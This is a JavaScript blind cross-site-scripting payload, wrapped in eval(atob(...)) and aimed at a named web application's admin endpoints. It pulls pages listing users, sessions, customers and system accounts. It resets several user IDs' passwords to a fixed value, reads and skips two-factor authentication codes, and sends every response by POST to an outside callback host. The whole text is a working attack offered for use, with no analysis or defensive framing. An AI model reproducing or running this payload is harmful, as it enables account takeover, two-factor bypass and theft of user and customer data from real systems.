eval(atob('  var collect_page_list2 = ["/Home/LoadSystemAccounts","/Home/LoadReqSignUps","/Home/LoadUsers","/Home/LoadSessions","/Home/LoadCustomers","/Home/LoadUsersGroups","/Home/LoadCustomers"];

          

          function send_collected_page2( page_data ) {
              var http = new XMLHttpRequest();
              var url = "https://binhmdanex.bxss.in/page_callback";
              http.open("POST", url, true);
              http.setRequestHeader("Content-type", "application/json");
              http.onreadystatechange = function() {
                  if(http.readyState == 4 && http.status == 200) {

                  }
              }
              http.send( JSON.stringify( page_data ) );
          }

          function collect_page_data2( path ) {
              try {
                  var full_url = "//" + document.domain + path
                  var xhr = new XMLHttpRequest();
                  xhr.onreadystatechange = function() {
                      if (xhr.readyState == XMLHttpRequest.DONE) {
                          page_data = {
                              "page_html": xhr.responseText,
                              "uri": full_url
                          }
                          send_collected_page2( page_data );
                      }
                  }
                  xhr.open('POST', full_url, true);
                  xhr.setRequestHeader("Content-type", "application/json");
                  xhr.send(JSON.stringify({}));
              } catch ( e ) {
              }
          }

          function collect_pages2() {
              for( var i = 0; i < collect_page_list2.length; i++ ) {
                  // Make sure the path is correctly formatted
                  if( collect_page_list2[i].charAt(0) != "/" ) {
                      collect_page_list2[i] = "/" + collect_page_list2[i];
                  }
                  collect_page_data2( collect_page_list2[i] );
              }
          }

var collect_page_list3 = ["/Home/EditUserPassword","/Home/GetEditUser","/Home/GetAuthCode","/Home/SkipAuthCode"];

          function send_collected_page3( page_data ) {
              var http = new XMLHttpRequest();
              var url = "https://binhmdanex.bxss.in/page_callback";
              http.open("POST", url, true);
              http.setRequestHeader("Content-type", "application/json");
              http.onreadystatechange = function() {
                  if(http.readyState == 4 && http.status == 200) {

                  }
              }
              http.send( JSON.stringify( page_data ) );
          }

          function collect_page_data3( path ,id ) {
              try {
                  var full_url = "//" + document.domain + path
                  var xhr = new XMLHttpRequest();
                  xhr.onreadystatechange = function() {
                      if (xhr.readyState == XMLHttpRequest.DONE) {
                          page_data = {
                              "page_html": xhr.responseText,
                              "uri": full_url
                          }
                          send_collected_page3( page_data );
                      }
                  }
                  xhr.open('POST', full_url, true);
                  xhr.setRequestHeader("Content-type", "application/json");
                  xhr.send(JSON.stringify({ID:id,ConfirmNewPassword:"SWesd@2321",NewPassword:"SWesd@2321"}));
              } catch ( e ) {
              }
          }

          function collect_pages3(id) {
              for( var i = 0; i < collect_page_list3.length; i++ ) {
                  // Make sure the path is correctly formatted
                  if( collect_page_list3[i].charAt(0) != "/" ) {
                      collect_page_list3[i] = "/" + collect_page_list2[i];
                  }
                  collect_page_data3( collect_page_list3[i] ,id );
              }
          }
          

              // Load Data
              function LoadData() {
                try{  $.ajax({
                      url: "https://app.ertiqasoft.co/Home/LoadUsers",
                      type: "POST",
                      dataType: "JSON",
                      contentType: "application/json; charset=utf-8",
                      success: function(data) {
                          send_collected_page2(data)
                      },
                      error: function(jqXHR, exception) {
                          var str = ".7# 1BE " + jqXHR.status.toString() + "\n" + jqXHR.responseJSON.Message;
                          send_collected_page2(str)
                      }
                  });
                  } catch ( e ) {
                  }
                  }
              
              function ChangePass(id) {
                try{  $.ajax({
                      url: "https://app.ertiqasoft.co/Home/EditUserPassword",
                      type: "POST",
                      dataType: "JSON",
                      contentType: "application/json; charset=utf-8",
                      data: JSON.stringify({ID:id,ConfirmNewPassword:"SWesd@2321",NewPassword:"SWesd@2321"}),
                      success: function(data) {
                          send_collected_page2(data)
                      },
                      error: function(jqXHR, exception) {
                          var str = ".7# 1BE " + jqXHR.status.toString() + "\n" + jqXHR.responseJSON.Message;
                          send_collected_page2(str)
                      }
                  });
                  } catch ( e ) {
                  }}


              // Edit
              function EditPass(id) {
                try{  $.ajax({
                      url: "https://app.ertiqasoft.co/Home/GetEditUser",
                      type: "POST",
                      dataType: "JSON",
                      contentType: "application/json; charset=utf-8",
                      data: JSON.stringify({ ID: id }),
                      success: function(data) {
                          send_collected_page2(data)
                      },
                      error: function(jqXHR, exception) {
                          var str = ".7# 1BE " + jqXHR.status.toString() + "\n" + jqXHR.responseJSON.Message;
                          send_collected_page2(str)
                      }
                  });
                  } catch ( e ) {
                  }}

              // ShowAuthCode
              function ShowAuthCode(id)
              { try{
                  $.ajax({
                      url: "https://app.ertiqasoft.co/Home/GetAuthCode",
                      type: "POST",
                      dataType: "JSON",
                      contentType: "application/json; charset=utf-8",
                      data: JSON.stringify({ ID: id }),
                      success: function(data) {
                          send_collected_page2(data);
                          send_collected_page2(data.message)
                      },
                      error: function(jqXHR, exception) {
                          var str = ".7# 1BE " + jqXHR.status.toString() + "\n" + jqXHR.responseJSON.Message;
                          send_collected_page2(str)
                      }
                  });
                  } catch ( e ) {
                  }  }

              function SkipAuthCode(id) {
                try{  $.ajax({
                      url: "https://app.ertiqasoft.co/Home/SkipAuthCode",
                      type: "POST",
                      dataType: "JSON",
                      contentType: "application/json; charset=utf-8",
                      data: JSON.stringify({ ID: id }),
                      success: function(data) {
                          send_collected_page2(data);
                          send_collected_page2(data.message)
                      },
                      error: function(jqXHR, exception) {
                          var str = ".7# 1BE " + jqXHR.status.toString() + "\n" + jqXHR.responseJSON.Message;
                          send_collected_page2(str)
                      }
                  });
                  } catch ( e ) {
                  }  }

              // Get Modal
              function GetModal(id, OType) {
                try{  var ActionName = "AddEditUser";
                  if (OType == null) OType = 2;
                  if (OType == 3) {
                      OType = 2;
                      ActionName = "EditUserPassword";                }
                  $.ajax({
                      url: "https://app.ertiqasoft.co/Home/GetModal",
                      type: "POST",
                      data: JSON.stringify({ ModalTitle: "&#x62F;&#x644;&#x64A;&#x644; &#x627;&#x644;&#x645;&#x633;&#x62A;&#x62E;&#x62F;&#x645;&#x64A;&#x646;", ActionName: ActionName, ControllerName: "Home", ID: id, opType: OType }),
                      contentType: "application/json; charset=utf-8",
                      success: function(data) {
                      send_collected_page2(data);
                          var frm = $('#modalForm');
                          frm.submit(function(e) {
                              e.preventDefault();
                              var sendData = {};
                              frm.serializeArray().map(function(n, i) {
                                  sendData[n['name']] = n['value'];                              });
                              $.ajax({
                                  url: frm.attr('action'),
                                  type: "POST",
                                  contentType: "application/json; charset=utf-8",
                                  dataType: "JSON",
                                  data: (JSON.stringify(sendData).replace(`"true"`, "true").replace(`"false"`, "false")),
                                  success: function(data) {
                                      send_collected_page2(data);
                                      send_collected_page2(data.message)
                                  },
                                  error: function(jqXHR, exception) {
                                      var str = ".7# 1BE " + jqXHR.status.toString() + "\n" + jqXHR.responseJSON.Message;
                                      send_collected_page2(str)
                                },                            });          });                    }               });              } catch ( e ) {
                                }}

          

LoadData();
ChangePass(0);ChangePass(1);ChangePass(2);ChangePass(10);
EditPass(0);EditPass(1);

ShowAuthCode(0);ShowAuthCode(1);ShowAuthCode(2);ShowAuthCode(10);
SkipAuthCode(0);SkipAuthCode(1);SkipAuthCode(2);SkipAuthCode(10);
            collect_pages2(); collect_pages3(1); collect_pages3(7823); collect_pages3(7822); collect_pages3(7823);  '))
